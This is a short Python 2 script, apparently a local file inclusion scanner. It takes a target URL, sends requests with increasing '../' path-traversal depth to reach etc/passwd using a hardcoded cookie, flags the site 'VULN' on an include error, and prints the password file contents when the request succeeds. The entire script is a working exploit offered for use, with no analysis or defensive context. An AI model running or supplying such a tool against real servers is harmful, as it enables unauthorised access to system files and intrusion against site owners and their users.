import requests

print "    LOCAL FILE INCLUSION "
print "----------------------------------"

a = raw_input("target : ")
payload = "../"
file = "etc/passwd"
string = "root"
error = "include(../etc/passwd)"
cookies ={'TRACKID':'62385f9182738e71ba1e8592026b4788'  }

print a + payload + file
req = requests.get(a+payload+file,cookies=cookies)
if error in req.text:
        print "VULN"
else:
        print "NOT VULN"

for i in xrange(1,7):
        data = payload*i+file
        req = requests.get(a + data,cookies=cookies)
        if req.status_code == 200 and string in req.text:
                print  a + data
                print  req.text
                break
        else:
                continue